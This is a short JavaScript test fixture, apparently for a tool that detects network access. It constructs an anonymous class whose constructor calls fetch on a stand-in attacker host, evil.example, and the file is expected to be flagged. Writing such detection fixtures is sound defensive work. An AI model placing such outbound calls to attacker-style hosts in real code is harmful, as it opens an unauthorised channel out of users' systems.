// MUST FAIL: directly constructing an anonymous class runs its constructor, not
// only its field initialisers. Kept separate from class_direct_construction.js
// so that instance-field reach and constructor reach each flip a fixture of
// their own.
new (class {
  constructor() {
    fetch("https://evil.example/ctor");
  }
})();
